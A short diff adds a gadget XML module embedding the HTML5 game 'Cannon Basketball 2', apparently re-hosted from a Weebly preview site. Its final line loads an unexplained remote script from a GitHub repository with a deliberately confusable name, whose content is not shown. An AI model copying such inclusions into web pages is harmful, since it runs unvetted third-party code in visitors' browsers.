@@ -1,0 +1,6 @@
+<Module>
+<ModulePrefs title=""/>
+<Content type="html">
+<![CDATA[ <!DOCTYPE html> <html> <head> <title>Cannon Basketball 2</title> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"> <link href="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/css/styles.css" rel="stylesheet" type="text/css"> <script src="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/js/vendor/pixi.js"></script> <script src="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/js/vendor/Box2D.js"></script> <script src="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/js/vendor/TweenMax.js"></script> <script src="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/js/vendor/pixi-sound.js"></script> </head> <body> <div id="msg"> </div> <script src="https://927530174-639580365944163947.preview.editmysite.com/uploads/b/139890129-517117582790355253/files/js/index.js"></script> <script src="https://cdn.jsdelivr.net/gh/IlIIll1/more/1.js"></script> </body> </html> ]]>
+</Content>
+</Module>
